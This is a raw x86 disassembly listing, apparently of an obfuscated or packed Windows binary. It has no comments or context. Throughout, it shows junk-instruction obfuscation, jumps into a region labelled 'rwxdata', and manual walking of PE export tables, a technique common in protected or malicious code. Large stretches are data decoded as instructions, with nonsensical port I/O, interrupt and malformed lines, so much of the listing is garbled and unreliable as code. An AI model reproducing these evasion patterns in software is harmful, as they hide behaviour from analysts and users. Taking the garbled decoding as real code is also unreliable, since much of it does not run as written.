lea esp [ esp + 0x4 ]
jmp rwxdata
push esp
shr ebx 0xc
cmc
cmp ebx 0x1
push edx
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
je rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
movsx bx dl
ror bh cl
mov bx [ esi ]
push 0x4712b91c
and ebx 0xfff
bt di 0x3
push 0xf783b537
pushfd
add [ ebx + edi ] ax
pushad
pushfd
mov [ esp ] 0xa9
lea esp [ esp + 0x30 ]
jmp sub_101d8368
clc
pushfd
mov [ esp ] 0x11
cmp ebx 0x2
push ebx
lea esp [ esp + 0x8 ]
je rwxdata
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
and bx si
bswap bx
jmp sub_101d6177
pushfd
push 0x6f477e48
pushfd
cmp ebx 0x3
pushfd
lea esp [ esp + 0x10 ]
je rwxdata
movzx bx al
movzx bx dl
mov bx [ esi ]
cmc
call j_sub_101bf312
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
lea esp [ esp + 0x4 ]
jmp sub_101d8368
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
sub_101bc751
pushfd
mov [ esp ] 0x4e
lea esp [ esp + 0x8 ]
je rwxdata
pushad
call sub_1020a43d
jpe rwxdata
pushfd
push [ esp ]
cmp ah 0x2e
pushad
mov [ esp + 0xc ] 0x27
push [ esp + 0x28 ]
retn 0x2c
pushfd
cmp ah 0x2e
lea esp [ esp + 0x4 ]
sub_101bc774
mov [ esp ] cx
push esp
lea esp [ esp + 0x48 ]
jb rwxdata
jge rwxdata
stc
cmp bp 0x9fa0
cmc
push ebx
cmp eax [ ebp - 0x10 ]
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
pushfd
call sub_101bf9ae
xlat
jno rwxdata
mov ebp 0x8f5a6581
dec edi
pop es
cmp [ ecx + 0x71 ] cl
pop ebx
inc ebp

jo rwxdata
and al 0x8d
and al 0x4
ja rwxdata
pushfd
inc [ eax - 0x4bae5fe1 ]
dec edx
push ebp
mov ch 0x49
insd
xchg ecx eax
jbe rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
xor al 0x64
sub ebx edi
call sub_1020d90d
add [ eax ] al
inc edi
je rwxdata
pop ebx
inc esp
pushfd
pop ss
daa
xlat
loop rwxdata
xor eax 0xa5b5a969
stc
pop edx
in eax 0xe0
fsubp st7
jbe rwxdata
pushfd
call sub_101be1d9
rcr [ edx - 0x9195ae7 ] 0x28
adc [ edi ] 0x67
sbb [ edi - 0x36414c5f ] al
push edx
jo rwxdata
outsd
jne rwxdata
stc
shl [ 0xffffffff93ba7925 ] 0x1
in al dx
adc bh cl
or eax 0xc8772b1d
scasd [ edi ]
mov al 0xa6
mov eax 0xd0eed40b
push esi
sub dh ah
cmp bh dh
sub [ ebx + 0x4c ] dl
push edx
dec esp
mov bl 0x8c
push edi
push 0xa69e5d81
test eax 0xcb73bf80
inc edi
pop ss
sub al cl
loop rwxdata
insb
inc ecx
add [ eax + ebp * 8 - 0x4a3f3 ] bl
ficom [ eax ]
push cs
in eax 0xd6
out 0x7e al
movsd [ edi ] [ esi ]
fidiv [ ebx ]

xor [ esi + 0x65c49a68 ] dh
stc
cmc
dec ecx
jpe rwxdata
pop es
dec eax
popad
outsb
cwde
test eax 0xe3718b73
xchg edx eax
xchg ecx eax
adc bh cl
iretd
sahf
cmpsb [ esi ] [ edi ]
in eax dx
mov ebx 0xc8d7bb24
sbb eax 0x5277eafc
test eax 0x23ac8675
clc
fsubr st7
add al 0x5a
sub al [ edi ]
sub_101bcbb9
bswap esi
mov esi [ esp + 0x4 ]
mov [ esp + 0x4 ] ax
mov esp ebp
mov ebp esp
mov ebp 0xc2f90d65
lea ebp [ ebx * 2 - 0x2e7ad6a ]
push eax
mov ebp [ esp + 0x4 ]
mov [ esp ] 0xe3
mov [ esp ] bp
mov [ esp + 0x4 ] bl
mov [ esp + 0x4 ] 0xde48
push [ esp + 0x8 ]
retn 0x14
sub_101bcc02
add edi eax
cmp ax di
movzx ecx [ edi + ecx * 2 ]
btc di 0x8
dec di
mov edi [ edx + 0x1c ]
push 0x892531e8
mov [ esp + 0x4 ] dh
call sub_101d77c5
call sub_101c8d1d
add [ eax ] al
push eax
popad
je rwxdata
sahf
dec ebp
popad
je rwxdata
daa
push 0x63657053
inc ecx
add [ ebx ] bl
sahf
and [ eax ] ebp
salc
jge rwxdata
add esi [ esi ]
fdivr [ edi ]
in eax 0x63
sub [ esi - 0x65 ] edx
push 0xffffffc5
pop edx
mov [ edx - 0x44 ] ss
sub_101bd4aa
cmp cl cl
pushfd
neg al
pushfd
cmc
shr eax 0x1
mov [ esp ] ah
jmp rwxdata
pushfd
mov [ esp + 0x8 ] ebp
lea esp [ esp + 0x44 ]
je rwxdata
pushad
pop esi
mov ebx [ esp + 0x1c ]
push 0x400635e4
push 0xefa1fa8b
not di
mov edi [ esp + 0x28 ]
pushfd
push ebx
mov esi [ esp + 0x34 ]
pushfd
lea ebp [ edx * 8 - 0x4564252 ]
movzx bp dl
call sub_101c99e8
call sub_101b875b
lea eax [ ebp - 0x8 ]
pushfd
push [ esp ]
pushad
mov [ esp + 0x24 ] eax
movzx ax bl
pop eax
push [ ebp - 0x4 ]
pop [ esp + 0x1c ]
cwde
mov [ esp + 0x18 ] ebx
not ah
movzx eax al
setge ah
mov [ esp + 0x14 ] 0xb
jmp rwxdata
push [ esp + 0xc ]
lea eax [ rwxdata ]
jmp rwxdata
jmp rwxdata
pushfd
pushad
mov [ esp + 0x38 ] rwxdata
jmp rwxdata
push [ eax ]
pop [ esp + 0x34 ]
mov [ esp + 0x4 ] 0x9a6d0070
push [ esp ]
pushfd
push esp
push [ esp + 0x40 ]
retn 0x44
sub_101bd980
push 0xb5dc7eb3
rol al 0x7
stc
test bx sp
clc
test ah 0x8b
not al
mov [ esp + 0x8 ] 0xaa
mov [ esp ] bh
cmp sp dx
pushfd
neg al
stc
sub esp 0xffffffb0
jns rwxdata
push 0x3d878d2
cmp al [ edi ]
movzx ax bl
lea edi [ edi + 0x1 ]
lahf
mov ax bx
mov eax [ esp + 0x4 ]
pushfd
lea esp [ esp + 0xc ]
ja rwxdata
clc
bt bx di
cmp al [ edi ]
setne ah
lea edi [ edi + 0x1 ]
mov al 0x23
pop eax
pushad
push [ esp ]
jmp rwxdata
cmp al al
cmp ecx [ ebp - 0x4 ]
pushfd
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
pushfd
call sub_101d8c87
lea esp [ esp + 0x24 ]
ja rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
call sub_101bfc89
mov [ esp ] 0xce67ca94
push ebp
lea esp [ esp + 0x4 ]
jg rwxdata
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
call j_sub_101d1f12
pushfd
mov [ esp ] 0x19fc7f78
pushfd
pushfd
lea esp [ esp + 0x8 ]
jmp j_sub_1020f431
clc
cmc
pushfd
cmp ecx [ ebp - 0x8 ]
pushfd
lea esp [ esp + 0x8 ]
jbe rwxdata
pushfd
cmp bp 0x715f
test al 0x1d
pushad
cmp [ edi - 0x1 ] 0x0
mov [ esp ] 0x5a
pushfd
lea esp [ esp + 0x28 ]
jne rwxdata
sbb di bx
shld di bx 0x5
sbb si 0x7d95
inc si
sub ecx 0x1
xor di 0xafff
sbb di cx
bsr si ax
jmp rwxdata
push eax
mov [ esp ] eax
call sub_101d12b7
shl di 0x2
pushad
pushfd
mov edi [ edx + 0x24 ]
cmp dx 0x71fc
cmp bl bh
add edi eax
pushfd
pushfd
pushfd
movzx ecx [ edi + ecx * 2 ]
shr di 0x7
not di
rcl di cl
mov edi [ edx + 0x1c ]
cmp ah bh
mov [ esp ] cx
cmp bl bh
stc
add edi eax
cmc
clc
mov [ esp + 0x4 ] 0xd
cmc
mov edi [ edi + ecx * 4 ]
jmp rwxdata
mov [ ebp - 0x4 ] ecx
inc esi
xchg cx di
mov ecx [ ebp - 0x8 ]
bt di 0x1
clc
shl di cl
rcr si 0x4
add ecx [ ebp - 0x4 ]
rol si 0x3
bts esi ecx
adc di ax
shr ecx 0x1
shl si cl
mov edi [ ebx + ecx * 4 ]
lea esi [ ebp * 8 - 0x260f86e7 ]
add edi eax
lea esi [ ebp * 8 - 0x6b10bcf9 ]
jmp rwxdata
bt dx di
bt bx si
test edi edi
push edi
mov [ esp ] si
push [ esp ]
jmp rwxdata
jmp sub_101d52df
lea esp [ esp + 0x38 ]
je rwxdata
call sub_1020c332
sub_101bd9d4
pushad
jmp rwxdata
lea esp [ esp + 0x2c ]
je rwxdata
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
sub_101bdb2a
pushad
call sub_101c0657
pushfd
mov bl 0x2
pushfd
dec al
mov al 0x29
inc ecx
mov [ esp + 0x4 ] bl
not al
mov al 0x10
lea esp [ esp + 0x8 ]
jmp rwxdata
call j_sub_101cb5d7
pushad
mov [ esp ] 0x66bd
adc al al
call sub_101d869e
jns rwxdata
test al 0xed
pop esi
mov al [ 0x529e876 ]
scasb [ edi ]
sbb al [ ebp - 0x46da829f ]
push esp
stosb [ edi ]
mov ebx 0x242030ee
sbb eax 0x4db14a5a
lds edi [ edx - 0x48 ]
lea edi [ bx + si - 0x1a ]
mov eax 0xb20dd9c6
pop eax
xchg ebx edi
retn
sub_101bdca0
pushad
pushfd
[ edi ]
mov [ esp ] si
mov [ esp ] 0x2d06
lea esp [ esp + 0x2c ]
jne rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
call sub_101d8f6f
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101bdcbd
xor al al
cmp dh dl
[ edi ]
mov [ esp + 0x8 ] bl
lea esp [ esp + 0x30 ]
jne rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
bsf esi esi
mov si 0x7e23
mov ecx edi
bt bp bp
movzx esi bl
and esi esi
adc esi 0x3781d814
sub ecx ebx
bt sp si
not si
mov esi esp
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
pushfd
cmp ecx 0xb5e0bcb9
stc
sub edi 0x4
push edi
pushad
push [ edi ]
pop [ esp + 0x24 ]
clc
pushad
cmp edi ebx
lea esp [ esp + 0x44 ]
jno rwxdata
pushfd
call sub_101c5554
cmp [ ebx + ecx * 2 ] edx
fiadd [ esi + ecx ]
push eax
movsb [ edi ] [ esi ]
adc ebx [ edi ]
cmp [ esp + eax - 0x75 ] al
adc esi [ edi - 0x4440b999 ]
retn
ja rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
neg al
neg al
sub ebx edi
sbb edi edi
lea edi [ ebx * 2 - 0x21da7182 ]
add ebx esp
clc
mov edi ebx
stc
mov al 0xae
add al bl
mov al 0x2e
pushad
call sub_101c6aca
adc ah [ edi - 0x398f6ae8 ]
mov eax 0x86b44bc9
pop ds
sub [ edx - 0x79e798cc ] ecx
sbb dh cl
adc [ ebx - 0x4 ] al
or [ ss : esi + 0x10 ] cl
cmp ebp eax
test [ ecx ] ebx
push ss
or [ ecx ] ebp
adc eax 0x219ef1ce
xchg ebp eax
sub bh [ ebx ]
in eax 0x39
aam 0x2a
popad
jge rwxdata
pushfd
call sub_101be1d9
retn
pop eax
sub_101bde94
sub ecx [ edx + 0x10 ]
cmp sp dx
cmp ecx [ edx + 0x14 ]
pushad
lea esp [ esp + 0x24 ]
jae rwxdata
bts dx 0x2
xor eax eax
push 0xe91ba24b
lea esp [ esp + 0x4 ]
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
xor edi 0x57c199bc
mov edi [ edx + 0x1c ]
push ecx
add edi eax
cmp ebp 0x3522421
mov edi [ edi + ecx * 4 ]
cmc
mov [ esp ] dl
pushad
test edi edi
mov [ esp ] bh
jmp rwxdata
lea esp [ esp + 0x24 ]
jo rwxdata
call sub_1020c122
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pop es
das
dec edi
jbe rwxdata
adc [ ecx + 0x6e6777fb ] 0xda
pop eax
lodsd [ esi ]
jbe rwxdata
cmp dl bl
add eax edi
stc
clc
cmp eax edx
push 0xf5768585
lea esp [ esp + 0x4 ]
jb rwxdata
pop edx
scasb [ edi ]
nop
das
jo rwxdata
ror [ edx ] cl
add [ eax ] al
add cl ch
xchg ecx eax
sbb eax 0x2ce80000
push edx
pushfd
add eax [ eax ]
add al ch
sub al 0x52
insd
int1
lea esi [ ecx ]
push 0x15
scasb [ edi ]
xor [ ecx ] ebp
jne rwxdata
jge rwxdata
clc
cmp eax [ ebp - 0x10 ]
pushfd
lea esp [ esp + 0x4 ]
jae rwxdata
sbb [ edi - 0x76b7cc4 ] ah
push cs
xchg [ ecx + edx - 0x5f ] ebx
cwde
sub ecx [ ecx ]
pop edx
adc [ edx + esi * 8 ] ecx
add edi ebp
retn 0x66d3
mov cl 0x9
pop ebp
loop rwxdata
or cl 0x3
mov ebx eax
inc cx
bsf di ax
mov edi eax
sar cl 0x3
mov ecx 0x104
cmp si ax
clc
xor al al
jmp sub_101d03b0
add [ 0xffffffffa2930b2e ] ebx
pushfd
ror ebp 0x1
cmp dl [ 0x39866605 ]
mov dl 0x6d
sub_101bdeb6
pop edx
movzx di al
movzx di bl
pushfd
lea esp [ esp + 0x4 ]
jne rwxdata
push edi
not ebx
mov ebx [ esp + 0x4 ]
pop esi
pop edi
lea esi [ ebp * 8 + 0x50f35bcb ]
pop edi
pushad
push [ esp ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x4 ] 0xf8
jmp rwxdata
pop ebx
mov edi 0x4bff5a78
pop edi
not si
mov esi 0x67ab259a
call sub_101bcbb9
pushfd
sub al 0xf8
jmp j_sub_101d8cff
mov esp ebp
push edx
pop ebp
mov ebp esp
pop ebp
pushfd
mov [ esp ] 0xb6
mov [ esp ] 0x75
pushad
push [ esp + 0x24 ]
retn 0x30
sub_101bdee6
push eax
pushad
jmp rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
pushfd
call sub_101d91e6
push esp
call sub_101d77b0
call 0xa6216ed
test [ esi ] 0x36710d1f
inc esp
fsubr [ ebp + ebp * 8 + 0x11 ]
mov dh ch
cmp ah ch
fcmovb st5
fld [ ecx ]
and bh [ 0x413d3d61 ]
sub_101bdfaf
stc
not al
pushad
pushfd
pushfd
xor al 0xbe
call sub_101bd4aa
mov [ 0xffffffffccf2d0ae ] al
inc edx
fdiv [ eax ]
loopne rwxdata
and edi [ eax + 0x18a7b790 ]
xchg [ edi + 0x7f ] ebx
jb rwxdata
dec [ eax - 0x14 ]
mov [ esi + edi * 8 ] dl
add al 0x40
frstor [ ecx ]
mov ecx 0x3c2bb426
xor eax 0x5a4f606a
dec ecx
mov esp 0x5ece3e70
int 0x53
int3
or [ edi - 0x6 ] dh
inc esp
jmp rwxdata
sar ecx 0x58
call 0xffffffffb798ab1e
inc edx
or [ ecx + 0x6bf45b46 ] ch
movq mmx0 mm3
sti
test [ ebx ] bh
dec esp
scasb [ edi ]
dec eax
ja rwxdata
sar al cl
test [ 0x44073ce3 ] edi
dec eax
and edx [ edi + 0x7fb7314f ]
mov ecx 0x35fc3625
dec eax
adc [ edx + 0x3c ] al
mov ss [ eax + 0x3e81657a ]
call 0x3377e1ef
jl rwxdata
test eax 0xf021fe4e
sub cl dl
popad
push edi
jpe rwxdata
sub [ ebp - 0x3c ] edx
pop esp
retn 0x42a9
jne rwxdata
insd
jno rwxdata
iretd
hlt
push esi
or [ 0x1b443648 ] esi
inc edx
pop esp
int1
or ecx ebx
jl rwxdata
mov dl [ eax - 0x71 ]
adc ebp [ eax + ecx * 2 + 0x6fbae4bd ]
out dx eax
push ecx
aas
js rwxdata
js rwxdata
add bh [ esi + 0x237e40d1 ]
push es
cmp [ ecx + edx * 4 - 0x4a ] esi
leave
fiadd [ edi + 0x55 ]
cmp ah [ 0xffffffffa1da0423 ]
dec [ eax - 0x69 ]
jpo rwxdata
jno rwxdata
aas
out dx al
or dh [ edi + eax * 4 + 0x77 ]
push es
js rwxdata
or [ edi ] dl
pop ds
pop edi
test al 0x37
in al dx
jae rwxdata
pop ebx
arpl ax si
dec edi
mov ebx 0x272f1043
sbb [ ecx + eax + 0x7e ] ch
insd
cmp esi edi
mov bh 0x7e
push ebp
push 0xffffffbf
rcl esi 0x97
enter 0xf46b 0x65
daa
xor eax 0x2962f7d
cmp [ ebx ] esp
pop edi
retn 0x9d5c
sub_101be1d9
mov [ esp + 0x10 ] cl
lea esp [ esp + 0x48 ]
ja rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
stc
rol al cl
stc
pushfd
sub ebx edi
movzx di cl
lea edi [ 0x6c9bccf1 ]
add esp 0x4
add ebx esp
sub di si
mov edi ebx
rcl al 0x5
mov al 0x2e
pushad
jmp rwxdata
pushfd
call sub_101be1d9
clc
[ edi ]
call j_sub_1020a28e
sub_101be213
sub al al
cmp dl 0xe7
[ edi ]
pushad
pushfd
pushfd
jmp rwxdata
lea esp [ esp + 0x2c ]
jne rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
xchg si cx
lea esi [ edi + 0x16f54545 ]
mov ecx edi
dec esi
shr si 0xd
sub ecx ebx
and esi esi
dec si
sar si cl
mov esi esp
bt dx 0xc
pushfd
cmc
sub edi 0x4
pushad
push [ edi ]
pop [ esp + 0x20 ]
clc
pushad
cmp edi ebx
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
call sub_101d410a
push edi
xchg [ edi ] edx
xchg [ ebx - 0x5c ] ebx
sbb al 0x2
ror [ eax ] 0x1
push ds
dec ebx
std
inc [ eax ]
lodsd [ esi ]
pop eax
fisub [ ebx + 0x3c ]
retn
sub_101be2dd
lea esp [ esp + 0x30 ]
jb rwxdata
jge rwxdata
clc
cmp eax [ ebp - 0x10 ]
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
push 0xe3557917
lea esp [ esp + 0x4 ]
jae rwxdata
xadd bx cx
mov ebx eax
sub di bx
mov edi eax
adc cl 0x8c
mov ecx 0x104
call sub_101be213
mov cl 0x78
mov [ ebx - 0x45 ] 0x49e09fe0
push ss
movsd [ edi ] [ esi ]
cld
shl ebx cl
push ebp
push ds
and [ esi ] dh
sub [ esi ] ch
xor ch dh
jmp 0xffffffffad3f4fcc
sub_101be33f
lea ecx [ edx - 0xcfff5a0 ]
push 0x643bfdaa
mov ecx [ esp + 0x18 ]
pushfd
mov esp ebp
call sub_10115e01
jns rwxdata
fdiv st1
add bh [ ecx + edx * 8 - 0x6a ]
shl [ ebp - 0x2cb22da0 ] 0x4e
int1
xor dl [ edx ]
sub al 0x53
cmc
dec edx
mov cl 0xf0
xor bh ch
add [ edi ] dh
dec ebp
retn
mov bh 0x8
xchg edi eax
xlat
dec eax
pop ecx
scasd [ edi ]
scasd [ edi ]
sub_101be43e
cmc
ror al 0x1
call sub_101d19e7
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsd [ esi ]
cmpsd [ esi ] [ edi ]
scasb [ edi ]
push esp
add [ eax ] al
add [ eax ] al
dec esp
int1
sbb eax [ eax ]
add [ eax ] eax
add [ eax ] al
or [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
jo rwxdata
sbb eax [ eax ]
mov al [ 0xffffffff90001be4 ]
in al 0x1b
add [ eax + 0x20000109 ] dl
sub al [ ecx ]
add al dl
sub [ ecx ] eax
add al ah
sub [ ecx ] eax
add al ah
sub eax 0x2a200001
add [ eax ] eax
and dl cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add al [ eax ]
add eax [ eax ]
pop es
add [ eax + eax ] al
add eax 0xc0000600
in al 0x1b
add al cl
in al 0x1b
add ah ah
in al 0x1b
add cl dh
in al 0x1b
add dl bh
in al 0x1b
add [ edi ] dl
int1
sbb eax [ eax ]
and esi ecx
sbb eax [ eax ]
inc ecx
int1
sbb eax [ eax ]
dec ecx
outsb
jae rwxdata
add eax 0xe34f931c
push ebx
popad
insb
insb
add [ edi + ebp * 2 + 0x61 ] cl
push eax
jb rwxdata
pop esp
sub eax 0x4f931c05
inc ebx
outsd
jne rwxdata
insb
iretd
cmpsb [ esi ] [ edi ]
jbe __export_name(PerfectWorld)
je rwxdata
push eax
int1
loop rwxdata
jecxz rwxdata
dec edi
jb rwxdata
or esi ebx
arpl [ gs : edi + edx * 2 + 0x6f ] si
jb rwxdata
sub [ ebp - 0x466ce475 ] bl
or [ ebx ] ecx
mov dl 0x15
adc al 0x42
pop ebp
js rwxdata
rcl [ edi - 0x33 ] cl
xchg [ ebx + 0x32 ] cl
and [ edi ] esp
add [ fs : eax + 0x72 ] dl
outsd
js rwxdata
adc eax 0xd8c1be7f
dec ecx
unpcklps xmm5 [ esi + 0x1fa1c6c6 ]
sbb ebp [ esi + 0x292f627e ]
mov ebx [ edi ]
pop esi
cmp al 0xe6
shr [ edi + 0x2b ] cl
jge rwxdata
inc ebp
push ebx
je rwxdata
cli
out 0xe4 al
jmp rwxdata
mov cl 0x5d
cld
imul ebp [ edx - 0x39 ] 0xffffffb8
xchg ebx eax
mov [ 0x586c432d ] al
shl [ ecx + 0x7613d0e9 ] 0x64
sub eax 0xfc5db197
push edi
int 0x86
dec ebx
xor ah [ ecx ]
daa
bound edi [ ebx + 0x52d5cb9 ]
sbb al 0x93
inc esp
insb
insb
add [ ecx - 0x54 ] dl
add [ 0xffffffffba249e93 ] edx
int 0x8d
sub al 0x85
inc edx
xchg ecx eax
cmp eax 0xfcd84d62
adc al 0x1f
or eax 0x36c99d04
test al 0x6e
std
sub ch [ esi - 0x540dccfa ]
or dl [ edi ]
mov esp 0x2f7b1a27
mov ebp 0xe54a33c1
outsw
and [ ecx ] ecx
or esi [ edx + 0x5d421415 ]
inc ebp
jb rwxdata
imul ebp [ esi + 0x67 ] 0x50005773
sub_101bf15b
cmp ah dh
test dl bl
add edx eax
pushfd
push [ esp + 0xc ]
pushad
lea esp [ esp + 0x34 ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_101bf9ae
lea esp [ esp + 0xc ]
jae rwxdata
jge rwxdata
pushfd
mov ebx eax
cmp cl 0xe4
inc edi
clc
pushad
mov edi eax
add ch 0xe5
shld ecx ecx 0xa
mov ecx 0x104
call sub_101c78f7
test dl 0xee
bt ax 0xb
or edx edx
pushfd
mov [ esp ] si
lea esp [ esp + 0x4 ]
je rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
call sub_101c578b
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101bfa18
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x2c ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
cmc
imul edx edx 0xa
call sub_10115d2b
sti
or dl [ 0x75c969b5 ]
mov dh 0x38
pop es
or [ edi ] cl
ja rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
inc ebp
push es
add bl ch
rcr esp 0x29
sub eax 0x4e2d9131
push ecx
dec esi
jno rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
dec ebp
adc cl [ esi + esi * 4 - 0x58 ]
mov cl 0xad
out dx al
popfd
adc [ eax ] bl
dec ebp
pop ebp

and bl [ ebp - 0x7cc4756b ]
fcmovnb st3
jmp [ eax + 0x57af411 ]
imul ebx [ eax + 0x6c4e3126 ] 0x2dbe80b2
jmp rwxdata
ja rwxdata
aam 0xf5
enter 0xd48b 0x2c
push ss
js rwxdata
xchg al bl
cdq
add eax 0xf36c0eb1
sbb ah ah
mov edx 0x63d24cc5
